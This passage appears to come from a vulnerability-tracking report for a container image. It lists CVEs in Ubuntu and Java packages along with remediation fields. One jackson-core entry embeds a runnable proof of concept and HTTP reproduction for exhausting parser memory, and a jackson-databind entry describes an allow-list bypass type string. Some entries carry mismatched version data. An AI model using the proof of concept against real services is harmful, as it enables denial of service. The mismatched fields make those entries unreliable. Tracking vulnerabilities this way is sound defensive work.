- Location: Ubuntu 22.04 runtime
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: affected
- Security Disposition: open
- Remediation: upgrade, rebuild base image, and investigate
- Tracking issue: 
- Exception expiry: 
- Notes: 

### CVE-2022-4899: A vulnerability was found in zstd v1.4.10, where an attacker can supply empty string as an argument to the command line tool to cause buffer overrun.

- Package: libzstd1
- Severity: LOW
- Installed version: 1.4.8+dfsg-3build1
- Fixed version: none
- Location: Ubuntu 22.04 runtime
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: affected
- Security Disposition: open
- Remediation: upgrade, rebuild base image, and investigate
- Tracking issue: 
- Exception expiry: 
- Notes: 

### CVE-2023-29383: In Shadow 4.13, it is possible to inject control characters into fields provided to the SUID program chfn (change finger). Although it is not possible to exploit this directly (e.g., adding a new user fails because \\n is in the block list), it is possible to misrepresent the /etc/passwd file when viewed. Use of \\r manipulations and Unicode characters to work around blocking of the : character make it possible to give the impression that a new user has been added. In other words, an adversary may be able to convince a system administrator to take the system offline (an indirect, social-engineered denial of service) by demonstrating that \"cat /etc/passwd\" shows a rogue user account.

- Package: login, passwd
- Severity: LOW
- Installed version: 1:4.8.1-2ubuntu2.2
- Fixed version: none
- Location: Ubuntu 22.04 runtime
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: affected
- Security Disposition: open
- Remediation: upgrade, rebuild base image, and investigate
- Tracking issue: 
- Exception expiry: 
- Notes: 

### CVE-2024-56433: shadow-utils (aka shadow) 4.4 through 4.17.0 establishes a default /etc/subuid behavior (e.g., uid 100000 through 165535 for the first user account) that can realistically conflict with the uids of users defined on locally administered networks, potentially leading to account takeover, e.g., by leveraging newuidmap for access to an NFS home directory (or same-host resources in the case of remote logins by these local network users). NOTE: it may also be argued that system administrators should not have assigned uids, within local networks, that are within the range that can occur in /etc/subuid.

- Package: login, passwd
- Severity: LOW
- Installed version: 1:4.8.1-2ubuntu2.2
- Fixed version: none
- Location: Ubuntu 22.04 runtime
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: affected
- Security Disposition: open
- Remediation: upgrade, rebuild base image, and investigate
- Tracking issue: 
- Exception expiry: 
- Notes: 

### CVE-2026-12087: Socket versions before 2.041 for Perl have an out-of-bounds heap read.\n\nIn Socket.xs, pack_ip_mreq_source() checks the length of its source argument before the argument is read, so the check tests the byte length carried over from the preceding multiaddr argument instead. Both addresses occupy a 4-byte field, so a valid multiaddr lets a source of any length pass the check, and the source is then copied into the 4-byte imr_sourceaddr field with a fixed-size copy. A source shorter than 4 bytes is not rejected, and the copy reads up to 3 bytes past the end of its buffer.\n\nCalling pack_ip_mreq_source() with a source value shorter than 4 bytes copies adjacent heap memory into the returned packed structure.
          
- Package: perl-base
- Severity: MEDIUM
- Installed version: 5.34.0-3ubuntu1.7
- Fixed version: 5.34.0-3ubuntu1.8
- Location: Ubuntu 22.04 runtime
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: fixed
- Security Disposition: open
- Remediation: upgrade, rebuild base image, and investigate
- Tracking issue: 
- Exception expiry: 
- Notes: 

### CVE-2026-13221: Perl versions through 5.43.9 produce silently incorrect regular expression matches when an alternation of more than 65535 fixed string branches is compiled into a trie in Perl_study_chunk.\n\nWhen such branches are combined into a trie, the delta between the first branch and the shared tail is stored in a 16-bit field. A branch count above 65535 overflows the field, and the trie's match decision table is truncated with no warning or error.\n\nA pattern of this shape produces false positive matches (matching strings it should not) and false negative matches (failing to match strings it should). When such a pattern gates an access or filtering decision, the result is wrong.
          
- Package: perl-base
- Severity: MEDIUM
- Installed version: 5.34.0-3ubuntu1.7
- Fixed version: 5.34.0-3ubuntu1.8
- Location: Ubuntu 22.04 runtime
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: fixed
- Security Disposition: open
- Remediation: 
- Tracking issue: 
- Exception expiry: 
- Notes: 

### CVE-2026-57432: Perl versions through 5.43.10 have an integer overflow in S_measure_struct leading to an out-of-bounds heap read in pack and unpack.\n\nS_measure_struct adds each item's size times its repeat count to a running total with no overflow check, so a large repeat count in a pack or unpack template wraps the signed SSize_t total negative. The @, X, and x position codes then guard their moves with a signed length comparison that passes when the length is negative, advancing the buffer pointer out of bounds.\n\nA template derived from untrusted input can read heap memory past the buffer and return it to the caller.

- Package: perl-base
- Severity: MEDIUM
- Installed version: 5.34.0-3ubuntu1.7
- Fixed version: 5.34.0-3ubuntu1.8
- Location: Ubuntu 22.04 runtime
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: fixed
- Security Disposition: open
- Remediation: 
- Tracking issue: 
- Exception expiry: 
- Notes: 

### CVE-2026-57433: Storable versions before 3.41 for Perl have a signed integer overflow when deserializing a crafted SX_HOOK record.\n\nretrieve_hook_common reads a signed 32-bit item count from an SX_HOOK record and calls av_extend with that count plus one. A count of I32_MAX wraps the addition to a negative value.\n\nA crafted blob passed to thaw or retrieve triggers the overflow; av_extend receives the negative count and dies with a panic, terminating the deserialization.
          
- Package: perl-base
- Severity: MEDIUM
- Installed version: 5.34.0-3ubuntu1.7
- Fixed version: 5.34.0-3ubuntu1.8
- Location: Ubuntu 22.04 runtime
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: fixed
- Security Disposition: open
- Remediation: 
- Tracking issue: 
- Exception expiry: 
- Notes: 

### CVE-2026-18477: A TOCTOU (Time-of-Check Time-of-Use) vulnerability in GNU tar's incremental dumpdir 'X' rename handling allows a local attacker with write access to a directory being backed up to influence the restore process if the attacker has access to the system where the restore is being performed. During restoration, files or directories may be created, renamed or overwritten outside the intended extraction directory. This could lead to unauthorized file modification or, in some cases, privilege escalation. Exploitation does not require the attacker to modify or craft the archive, and standard backup and restore workflows—including extracting into a newly created directory without using the -P option do not mitigate the issue.
          
- Package: tar
- Severity: MEDIUM
- Installed version: 1.34+dfsg-1ubuntu0.1.22.04.6
- Fixed version: none
- Location: Ubuntu 22.04 runtime
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: <>
- Security Disposition: open
- Remediation: 
- Tracking issue: 
- Exception expiry: 
- Notes: 

### CVE-2026-18508: A flaw was found in GNU tar. When extracting an archive with the --one-top-level option, hardlink targets are not confined to the designated top-level directory and may resolve relative to the extraction working directory. A crafted archive can create hardlinks that escape the intended boundary and, when combined with a preexisting symbolic link under the working directory, may allow writing outside that boundary during a single extraction.
          
- Package: tar
- Severity: MEDIUM
- Installed version: 1.34+dfsg-1ubuntu0.1.22.04.6
- Fixed version: none
- Location: Ubuntu 22.04 runtime
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: affected
- Security Disposition: open
- Remediation: 
- Tracking issue: 
- Exception expiry: 
- Notes: 

### CVE-2021-31879: GNU Wget through 1.21.1 does not omit the Authorization header upon a redirect to a different origin, a related issue to CVE-2018-1000007.
          
- Package: wget
- Severity: MEDIUM
- Installed version: 1.21.2-2ubuntu1.5
- Fixed version: none
- Location: Ubuntu 22.04 runtime
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: affected
- Security Disposition: open
- Remediation: 
- Tracking issue: 
- Exception expiry: 
- Notes: 

### CVE-2026-10532 : Deserialization of untrusted data vulnerability in QOS.CH Sarl logback logback-core (HardenedObjectInputStream (logback-core) modules) allows Object Injection, albeit heavily restricted.\n\nMore precisely, an attacker able to influence serialized data sent to \nSimpleSocketServer or SimpleSSLSocketServer can instantiate Proxy objects.\n\n\nAlthough deserialization is heavily restricted by HardenedObjectInputStream and no \npractical way to achieve remote code execution or significant privilege \nescalation has been identified, this issue constitutes a bypass of the \nintended security restrictions.\n\n\n\nThis issue affects logback: through 1.5.33 inclusive.
          
- Package: ch.qos.logback:logback-core
- Severity: LOW
- Installed version: 1.5.32
- Fixed version: 1.5.34
- Location: Java application layer
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: fixed
- Security Disposition: open
- Remediation: 
- Tracking issue: 
- Exception expiry: 
- Notes:

### CVE-2026-9828 : Deserialization of untrusted data vulnerability in QOS.CH Sarl logback logback-core (HardenedObjectInputStream (logback-core) modules) allows Object Injection albeit heavily restricted.\n\nMore precisely, an attacker able to influence serialized data sent to \nSimpleSocketServer or SimpleSSLSocketServer can instantiate objects from\n classes in the java.lang and java.util packages that are not explicitly\n blocked.\n\nAlthough deserialization is heavily restricted by HardenedObjectInputStream and no \npractical way to achieve remote code execution or significant privilege \nescalation has been identified, this issue constitutes a bypass of the \nintended security restrictions.\n\n\n\nThis issue affects logback: through 1.5.32 inclusive.
          
- Package: ch.qos.logback:logback-core
- Severity: LOW
- Installed version: 2.21.2
- Fixed version: 2.18.8, 2.21.4
- Location: Java application layer
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: fixed
- Security Disposition: open
- Remediation: 
- Tracking issue: 
- Exception expiry: 
- Notes:

  ### GHSA-r7wm-3cxj-wff9:## Summary\n\nThe fix released in jackson-core `2.18.6` and `2.21.1` for [GHSA-72hv-8253-57qq](https://github.com/FasterXML/jackson-core/security/advisories/GHSA-72hv-8253-57qq) (Number Length Constraint Bypass in Async Parser, published 2026-02-28) is incomplete. The fix commit `b0c428e6` (#1555) wired `validateIntegerLength` into a new `_setIntLength` helper and called it at every place where the integer portion of a number is *decided* (terminator byte arrived, `.` / `e/E` seen, end-of-feed inside a fully-buffered value). It did not call it on the much more attacker-relevant path: \"ran out of input while still inside `MINOR_NUMBER_INTEGER_DIGITS`, return `NOT_AVAILABLE` to caller\".\n\nAs a result, an attacker who streams JSON to a non-blocking parser in many small chunks, without ever sending a terminator byte, can keep the parser inside `MINOR_NUMBER_INTEGER_DIGITS` indefinitely. `_textBuffer.expandCurrentSegment()` grows on every chunk, and `validateIntegerLength` is never invoked. The accumulator is only gated by `maxStringLength` (20 MiB default) — a **~20,000x amplification** of the documented `maxNumberLength` (1000 default).\n\nThis is the same vulnerability class, same advisory wording (\"Memory Exhaustion: Unbounded allocation in TextBuffer from excessively long numbers\"), same parser class — just the streaming path the original fix didn't cover. The fix to the *fraction* path is correct (see `_finishFloatFraction` at line 1834-1837 of `NonBlockingUtf8JsonParserBase.java` in 2.18.6, where `_setFractLength(fractLen)` IS called before the `NOT_AVAILABLE` return); the equivalent call is missing from every integer-digit path.\n\n## Affected versions\n\nVerified on the patched releases:\n- `com.fasterxml.jackson.core:jackson-core` **2.18.6**\n- `com.fasterxml.jackson.core:jackson-core` **2.21.1**\n\nStructurally identical code in `tools.jackson.core` 3.0.x / 3.1.x — same `NonBlockingUtf8JsonParserBase` class, same `_setIntLength` rollout, same NOT_AVAILABLE returns without validation. Not retested but presumed vulnerable.\n\n## Affected code\n\n[`src/main/java/com/fasterxml/jackson/core/json/async/NonBlockingUtf8JsonParserBase.java`](https://github.com/FasterXML/jackson-core/blob/b0c428e6/src/main/java/com/fasterxml/jackson/core/json/async/NonBlockingUtf8JsonParserBase.java) in 2.18.6 / 2.21.1.\n\n### Site 1 — `_startPositiveNumber(int ch)` lines 1320-1330:\n\n```java\nif (outPtr \u003e= outBuf.length) {\n    // NOTE: must expand to ensure contents all in a single buffer (to keep\n    // other parts of parsing simpler)\n    outBuf = _textBuffer.expandCurrentSegment();\n}\noutBuf[outPtr++] = (char) ch;\nif (++_inputPtr \u003e= _inputEnd) {\n    _minorState = MINOR_NUMBER_INTEGER_DIGITS;\n    _textBuffer.setCurrentLength(outPtr);\n    return _updateTokenToNA();          // \u003c-- no validateIntegerLength(outPtr)\n}\n```\n\n### Site 2 — `_finishNumberIntegralPart` lines 1691-1727:\n\n```java\nprotected JsonToken _finishNumberIntegralPart(char[] outBuf, int outPtr) throws IOException {\n    int negMod = _numberNegative ? -1 : 0;\n\n    while (true) {\n        if (_inputPtr \u003e= _inputEnd) {\n            _minorState = MINOR_NUMBER_INTEGER_DIGITS;\n            _textBuffer.setCurrentLength(outPtr);\n            return _updateTokenToNA();    // \u003c-- no validateIntegerLength(outPtr + negMod)\n        }\n        int ch = getByteFromBuffer(_inputPtr) \u0026 0xFF;\n        if (ch \u003c INT_0) {\n            if (ch == INT_PERIOD) {\n                _setIntLength(outPtr+negMod);   // \u003c-- validated here\n                ++_inputPtr;\n                return _startFloat(outBuf, outPtr, ch);\n            }\n            break;\n        }\n        if (ch \u003e INT_9) {\n            if ((ch | 0x20) == INT_e) {\n                _setIntLength(outPtr+negMod);   // \u003c-- validated here\n                ++_inputPtr;\n                return _startFloat(outBuf, outPtr, ch);\n            }\n            break;\n        }\n        ++_inputPtr;\n        if (outPtr \u003e= outBuf.length) {\n            outBuf = _textBuffer.expandCurrentSegment();\n        }\n        outBuf[outPtr++] = (char) ch;\n    }\n    _setIntLength(outPtr+negMod);            // \u003c-- validated here\n    _textBuffer.setCurrentLength(outPtr);\n    return _valueComplete(JsonToken.VALUE_NUMBER_INT);\n}\n```\n\nThe pattern recurs at lines 1297, 1329, 1343, 1365, 1395, 1409, 1437, 1467, 1481, 1586, 1644, 1698 — every \"ran out of input mid-integer\" exit returns to the caller without validating the accumulator length.\n\n### Compare with the fraction path that is correct\n\n`_finishFloatFraction` lines 1827-1838:\n\n```java\nwhile (loop) {\n    if (ch \u003e= INT_0 \u0026\u0026 ch \u003c= INT_9) {\n        ++fractLen;\n        if (outPtr \u003e= outBuf.length) {\n            outBuf = _textBuffer.expandCurrentSegment();\n        }\n        outBuf[outPtr++] = (char) ch;\n        if (_inputPtr \u003e= _inputEnd) {\n            _textBuffer.setCurrentLength(outPtr);\n            _setFractLength(fractLen);          // \u003c-- VALIDATED\n            return JsonToken.NOT_AVAILABLE;\n        }\n        ch = getNextSignedByteFromBuffer();\n    }\n    ...\n}\n```\n\n## Impact\n\nReactive frameworks (Spring WebFlux / Reactor, Quarkus, Helidon, Vert.x JSON, anything wrapping `JsonFactory.createNonBlockingByteArrayParser()` or `createNonBlockingByteBufferParser()`) feed inbound HTTP/gRPC bytes to the async parser as they arrive. Operators who set `StreamReadConstraints.builder().maxNumberLength(N)` on the assumption that this caps memory per number value are not getting that guarantee in chunked-feed scenarios. The parser silently accumulates digits up to `maxStringLength` (20 MiB default) per concurrent connection. Multiply by attacker-controlled concurrency to OOM the JVM.\n\nThe synchronous parsers (`UTF8StreamJsonParser`, `ReaderBasedJsonParser`) and the async parser on *complete* input are not affected — those paths go through `_setIntLength` or `ParserBase._reportTooLongIntegral` correctly.\n\nCWE-770 (Allocation of Resources Without Limits or Throttling), CVSS roughly the same as the parent advisory (Network / Low complexity / High availability impact). The parent advisory was scored CVSS 8.7 High.\n\n## Proof of concept\n\nStandalone PoC, no Maven required:\n\n```\nmkdir poc \u0026\u0026 cd poc\ncurl -sLo jackson-core-2.18.6.jar https://repo1.maven.org/maven2/com/fasterxml/jackson/core/jackson-core/2.18.6/jackson-core-2.18.6.jar\ncat \u003e PoC.java \u003c\u003c'EOF'\nimport com.fasterxml.jackson.core.*;\nimport com.fasterxml.jackson.core.async.ByteArrayFeeder;\n\npublic class PoC {\n    public static void main(String[] args) throws Exception {\n        StreamReadConstraints strict = StreamReadConstraints.builder()\n                .maxNumberLength(1000)\n                .build();\n        JsonFactory f = new JsonFactoryBuilder()\n                .streamReadConstraints(strict)\n                .build();\n\n        // Sanity: synchronous parser rejects 5000-digit int.\n        try (JsonParser p = f.createParser(\"{\\\"v\\\":\" + \"1\".repeat(5000) + \"}\")) {\n            while (p.nextToken() != null) { /* drive */ }\n            System.out.println(\"[-] BUG ABSENT: sync parser accepted\");\n            return;\n        } catch (Exception e) {\n            System.out.println(\"[+] sync parser rejected 5000-digit int: \" + e.getClass().getSimpleName());\n        }\n\n        // Bug: async parser, chunked, no terminator.\n        JsonParser ap = f.createNonBlockingByteArrayParser();\n        ByteArrayFeeder feeder = (ByteArrayFeeder) ap;\n\n        byte[] preamble = \"{\\\"v\\\":\".getBytes(\"UTF-8\");\n        feeder.feedInput(preamble, 0, preamble.length);\n        while (ap.nextToken() != JsonToken.NOT_AVAILABLE) { /* drain */ }\n\n        byte[] digits = new byte[16 * 1024];\n        for (int i = 0; i \u003c digits.length; i++) digits[i] = (byte) ('1' + (i % 9));\n\n        for (int c = 0; c \u003c 600; c++) {\n            feeder.feedInput(digits, 0, digits.length);\n            JsonToken t = ap.nextToken();\n            if (t != JsonToken.NOT_AVAILABLE) {\n                System.out.println(\"[-] unexpected token: \" + t);\n                return;\n            }\n        }\n        System.out.println(\"[+] BUG PRESENT: async parser accepted ~9.83 MB of digits with maxNumberLength=1000\");\n\n        // Closing the number now finally triggers the validator.\n        feeder.feedInput(\"}\".getBytes(\"UTF-8\"), 0, 1);\n        feeder.endOfInput();\n        try {\n            while (ap.nextToken() != null) { /* drive */ }\n        } catch (Exception e) {\n            System.out.println(\"[*] late rejection on close: \" + e.getMessage().split(\"\\n\")[0]);\n        }\n        ap.close();\n    }\n}\nEOF\njavac -cp jackson-core-2.18.6.jar PoC.java\njava -Xmx256m -cp jackson-core-2.18.6.jar:. PoC\n```\n\nObserved output against `jackson-core-2.18.6`:\n\n```\n[+] sync parser rejected 5000-digit int: StreamConstraintsException\n[+] BUG PRESENT: async parser accepted ~9.83 MB of digits with maxNumberLength=1000\n[*] late rejection on close: Number value length (9830400) exceeds the maximum allowed (1000, from `StreamReadConstraints.getMaxNumberLength()`)\n```\n\nObserved output against `jackson-core-2.21.1`: identical.\n\nThe 9.83 MB figure is purely a function of the loop bound (600 chunks * 16 KiB). The actual ceiling is `maxStringLength = 20 MiB`. With the strict policy declared as `maxNumberLength = 1000`, the parser permits **9830x** more allocation than the policy allows. With `maxStringLength` left at the default 20 MiB, an attacker can drive a single connection to 40 MiB of `char[]` heap (chars are 2 bytes each) before the validator finally fires on terminator/`endOfInput()`. Multiply by concurrent connections.\n\n## End-to-end reproduction through real HTTP\n\nSupplements the standalone PoC with a running Spring Boot WebFlux server,\ndriving the same bug through the actual reactor-netty + Jackson2JsonDecoder\nstreaming-decode path that production reactive endpoints use.\n\nSetup:\n- Spring Boot 3.3.5 starter-webflux (spring-webflux 6.1.14, reactor-netty 1.1.23)\n- jackson-databind 2.17.2, jackson-core overridden:\n  - VULN run: `com.fasterxml.jackson.core:jackson-core:2.18.7` (latest published)\n  - PATCHED run: `2.18.8-SNAPSHOT` built from the fix branch\n- JVM: OpenJDK 17.0.18\n- Server `JsonFactory` configured with `StreamReadConstraints.builder().maxNumberLength(1000).build()`\n\nEndpoint under test exposes the `Flux\u003cDataBuffer\u003e` request body directly to\n`Jackson2JsonDecoder.decode(Flux, ResolvableType, ...)` so the parser sees one\nHTTP chunk per `feedInput` (the same pattern used for any\n`@RequestBody Flux\u003c...\u003e` / streaming JSON decoder in WebFlux). A raw-socket\nHTTP/1.1 chunked client streams `{\"v\":1` then 250 chunks of 200 digit bytes\neach (50,000 digits total) at 20ms intervals, then writes the closing `}`.\n\nVULN — jackson-core 2.18.7:\n```\n[VULN-SMALLCHUNK] streamed 50000 digits across 250 chunks; server still accepting\n[VULN-SMALLCHUNK] full POST sent (50000 digits). Response:\nHTTP/1.1 200 OK\nERR after 6548ms cause=com.fasterxml.jackson.core.exc.StreamConstraintsException:\n       Number value length (50000) exceeds the maximum allowed (1000, ...)\n```\nServer-side controller trace (250 DataBuffer arrivals elided):\n```\n[ctrl] DataBuffer arrived size=6   ms=39       \u003c- '{\"v\":1'\n[ctrl] DataBuffer arrived size=200 ms=42\n...\n[ctrl] DataBuffer arrived size=199 ms=5993\n[ctrl] DataBuffer arrived size=1   ms=6518     \u003c- closing '}'\n[ctrl] ERR after 6548ms ... Number value length (50000) exceeds ...\n```\nServer held all 50,000 digit characters in `_textBuffer` for 6.5 seconds with\n`maxNumberLength=1000` declared. The validator never fires during streaming;\nit only fires at value-completion when the closing `}` arrives.\n\nPATCHED — jackson-core 2.18.8-SNAPSHOT (fix branch):\n```\n[PATCHED-SMALLCHUNK] connection broke after 2801 digits at chunk 14: [Errno 32] Broken pipe\n[PATCHED-SMALLCHUNK] DONE: digits_sent=2801 status=connection-broke-mid-stream\n```\nServer-side controller trace:\n```\n[ctrl] DataBuffer arrived size=6   ms=129\n[ctrl] DataBuffer arrived size=200 ms=142\n[ctrl] DataBuffer arrived size=200 ms=142\n[ctrl] DataBuffer arrived size=200 ms=145\n[ctrl] DataBuffer arrived size=200 ms=146\n[ctrl] DataBuffer arrived size=200 ms=147\n[ctrl] ERR after 155ms ... Number value length (1001) exceeds the maximum allowed (1000, ...)\n```\nPatched server raises `StreamConstraintsException` at 155ms after only 5\nDataBuffers, exactly when the accumulated digit count crosses\n`maxNumberLength=1000`. The connection is reset mid-stream rather than the\nparser silently consuming the rest of the attacker's payload.\n\nSide-by-side:\n\n| Build | Chunks accepted before exception | Digits buffered | Time to detection |\n|---|---|---|---|\n| jackson-core 2.18.7 | 250 (full payload) | 50,000 (50x the configured limit) | 6,548ms — only at terminator |\n| 2.18.8-SNAPSHOT (fix branch) | 5 | 1,001 | 155ms — moment threshold crossed |\n\nNote on the default `@RequestBody Mono\u003cJsonNode\u003e` path: that path cannot\ndistinguish the two builds because Spring's `decodeToMono` joins all\nDataBuffers into one before parsing. The exploitable shape is the\nstreaming-decode path (`Flux\u003cJsonNode\u003e` / `@RequestBody Flux\u003c...\u003e` /\nWebSocket / SSE / any direct `decoder.decode(Flux\u003cDataBuffer\u003e, ...)` call),\nwhich is also what `Jackson2Tokenizer` uses for any streaming JSON\ndeserialization in WebFlux and Quarkus reactive REST.\n\n## Suggested fix\n\nMirror the pattern already used in `_finishFloatFraction`. At every site that returns `_updateTokenToNA()` (or `JsonToken.NOT_AVAILABLE`) with `_minorState = MINOR_NUMBER_INTEGER_DIGITS`, call `_setIntLength(outPtr + negMod)` first. Concretely, the diff to `NonBlockingUtf8JsonParserBase.java` would be:\n\n```diff\n     protected JsonToken _finishNumberIntegralPart(char[] outBuf, int outPtr) throws IOException {\n         int negMod = _numberNegative ? -1 : 0;\n\n         while (true) {\n             if (_inputPtr \u003e= _inputEnd) {\n                 _minorState = MINOR_NUMBER_INTEGER_DIGITS;\n                 _textBuffer.setCurrentLength(outPtr);\n+                _streamReadConstraints.validateIntegerLength(outPtr + negMod);\n                 return _updateTokenToNA();\n             }\n```\n\nNote: `_setIntLength` itself can't be used as-is because it also assigns `_intLength`, and `_intLength` must not be set until the integer is truly complete (subsequent fraction handling reads `_intLength`). The minimal fix is to call only the validator, as shown.\n\nApply the same one-line insertion before each `return _updateTokenToNA();` that exits with `_minorState = MINOR_NUMBER_INTEGER_DIGITS`. The sites are listed above (12 lines total).\n\nAlternatively, a heavier refactor: also gate `_textBuffer.expandCurrentSegment()` calls inside the digit-accumulation loops on `outPtr \u003c maxNumberLength` so that the validator fires at the moment the buffer would be enlarged past the limit, rather than waiting for the next chunk boundary. Either approach is sufficient.\n\n## Credit\n\nReported by `tonghuaroot` (`tonghuaroot@gmail.com`). Variant hunt against the Feb 2026 fix for GHSA-72hv-8253-57qq.
          
- Package: com.fasterxml.jackson.core:jackson-core
- Severity: HIGH
- Installed version: 2.21.2
- Fixed version: 2.18.8, 2.21.4
- Location: Java application layer
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: fixed
- Security Disposition: open
- Remediation: 
- Tracking issue: 
- Exception expiry: 
- Notes:

### CVE-2026-54512: jackson-databind contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor. From 2.10.0 until 2.18.8, 2.21.4, and 3.1.4, jackson-databind's PolymorphicTypeValidator (PTV) is the primary safety mechanism guarding polymorphic deserialization. When polymorphic typing is enabled and a type identifier contains generic parameters (i.e. the type ID string contains \u003c), DatabindContext._resolveAndValidateGeneric() validates only the raw container class name (the substring before \u003c) against the configured PTV. If the container type is approved, the method parses the full canonical type string via TypeFactory.constructFromCanonical() and returns the fully parameterized type without ever validating the nested type arguments against the PTV. The nested type arguments are then resolved, instantiated, and populated as beans during deserialization. An attacker who controls the type ID can therefore place a denied class as a generic type parameter of an allowed container — for example java.util.ArrayList\u003ccom.evil.Gadget\u003e when only java.util.ArrayList is allow-listed. The container passes the PTV check; com.evil.Gadget is loaded via Class.forName(name, true, loader), instantiated, and its properties are set from attacker-controlled JSON. This completely bypasses an explicitly configured PTV allow-list. This vulnerability is fixed in 2.18.8, 2.21.4, and 3.1.4.
          
- Package: com.fasterxml.jackson.core:jackson-databind
- Severity: HIGH
- Installed version: 2.15.2
- Fixed version: 2.18.8, 3.1.4, 2.21.4
- Location: Java application layer
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: fixed
- Security Disposition: open
- Remediation: 
- Tracking issue: 
- Exception expiry: 
- Notes:

  ### CVE-2026-54513 : jackson-databind contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor. From 2.10.0 until 2.18.8, 2.21.4, and 3.1.4, BasicPolymorphicTypeValidator.Builder.allowIfSubTypeIsArray() allowlists any array type based only on clazz.isArray(), without validating the array's component (element) type against the configured allowlist. A PTV built with allowIfSubTypeIsArray() plus an explicit concrete-type allowlist therefore still permits EvilType[] even though EvilType is not allowlisted. When Jackson deserializes the elements and no per-element type IDs are present, it instantiates the component type directly with no further PTV check, bypassing the allowlist. This vulnerability is fixed in 2.18.8, 2.21.4, and 3.1.4.
          
- Package: com.fasterxml.jackson.core:jackson-databind
- Severity: HIGH
- Installed version: 2.15.2
- Fixed version: 2.18.8, 2.21.4, 3.1.4
- Location: Java application layer
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: fixed
- Security Disposition: open
- Remediation: 
- Tracking issue: 
- Exception expiry: 
- Notes:

  ### CVE-2026-54514:jackson-databind contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor. From 2.0.0 until 2.18.8, 2.21.4, and 3.1.4, JDKFromStringDeserializer constructed InetSocketAddress with new InetSocketAddress(host, port), which performs eager DNS name resolution for hostname inputs at deserialization time. An application that binds untrusted JSON into a type containing an InetSocketAddress field issues an attacker-chosen DNS query during readValue, before any application-level validation or connect logic. The fix uses InetSocketAddress.createUnresolved(host, port), deferring DNS to an explicit connect. This vulnerability is fixed in 2.18.8, 2.21.4, and 3.1.4.
          
- Package: com.fasterxml.jackson.core:jackson-databind
- Severity: MEDIUM
- Installed version: 2.15.2
- Fixed version: 2.18.8, 2.21.4, 3.1.4
- Location: Java application layer
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: fixed
- Security Disposition: open
- Remediation: 
- Tracking issue: 
- Exception expiry: 
- Notes:

  ### CVE-2026-54515:jackson-databind contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor. From 2.8.0 until 2.18.9, 2.21.5, and 3.1.4, in BeanDeserializerBase.createContextual(), per-property @JsonIgnoreProperties exclusions are applied by _handleByNameInclusion(), producing a contextual deserializer whose BeanPropertyMap has the ignored properties removed. The subsequent per-property case-insensitivity block (triggered by @JsonFormat(ACCEPT_CASE_INSENSITIVE_PROPERTIES)) rebuilds from this._beanProperties (the original, unfiltered map) instead of contextual._beanProperties, then overwrites the filtered map — restoring every property _handleByNameInclusion had just removed. The ignored property becomes writable again. This vulnerability is fixed in 2.18.9, 2.21.5, and 3.1.4. 
          
- Package: com.fasterxml.jackson.core:jackson-databind
- Severity: MEDIUM
- Installed version: 2.15.2
- Fixed version: 3.1.4, 2.18.9, 2.21.5, 2.22.1
- Location: Java application layer
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: fixed
- Security Disposition: open
- Remediation: 
- Tracking issue: 
- Exception expiry: 
- Notes: 

### CVE-2026-59888: jackson-databind contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor. From 2.15.0 until 2.18.8, 2.21.4, and 3.1.4, Java Records using a PropertyNamingStrategy can bypass @JsonIgnore because POJOPropertiesCollector._removeUnwantedIgnorals() records an ignored component under its original implicit name before _renameUsing() applies the naming strategy, allowing the renamed JSON key to be assigned to the Record constructor parameter. This issue is fixed in versions 2.18.8, 2.21.4, and 3.1.4.
          
- Package: com.fasterxml.jackson.core:jackson-databind
- Severity: MEDIUM
- Installed version: 2.15.2
- Fixed version: 2.18.8, 2.21.4
- Location: Java application layer
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: fixed
- Security Disposition: open
- Remediation: 
- Tracking issue: 
- Exception expiry: 
- Notes:

  ### CVE-2021-22569:An issue in protobuf-java allowed the interleaving of com.google.protobuf.UnknownFieldSet fields in such a way that would be processed out of order. A small malicious payload can occupy the parser for several minutes by creating large numbers of short-lived objects that cause frequent, repeated pauses. We recommend upgrading libraries beyond the vulnerable versions.
          
- Package: com.google.protobuf:protobuf-java
- Severity: HIGH
- Installed version: 3.11.4
- Fixed version: 3.16.1, 3.18.2, 3.19.2
- Location: Java application layer
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: fixed
- Security Disposition: open
- Remediation: 
- Tracking issue: 
- Exception expiry: 
- Notes:

  ### CVE-2022-3509:A parsing issue similar to CVE-2022-3171, but with textformat in protobuf-java core and lite versions prior to 3.21.7, 3.20.3, 3.19.6 and 3.16.3 can lead to a denial of service attack. Inputs containing multiple instances of non-repeated embedded messages with repeated or unknown fields causes objects to be converted back-n-forth between mutable and immutable forms, resulting in potentially long garbage collection pauses. We recommend updating to the versions mentioned above.
          
- Package: com.google.protobuf:protobuf-java
- Severity: HIGH
- Installed version: 3.11.4
- Fixed version: 3.16.3, 3.19.6, 3.20.3, 3.21.7
- Location: Java application layer
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: fixed
- Security Disposition: open
- Remediation: 
- Tracking issue: 
- Exception expiry: 
- Notes:

  ### CVE-2022-3510: A parsing issue similar to CVE-2022-3171, but with Message-Type Extensions in protobuf-java core and lite versions prior to 3.21.7, 3.20.3, 3.19.6 and 3.16.3 can lead to a denial of service attack. Inputs containing multiple instances of non-repeated embedded messages with repeated or unknown fields causes objects to be converted back-n-forth between mutable and immutable forms, resulting in potentially long garbage collection pauses. We recommend updating to the versions mentioned above.\n\n
          
- Package: com.google.protobuf:protobuf-java
- Severity: HIGH
- Installed version: 3.11.4
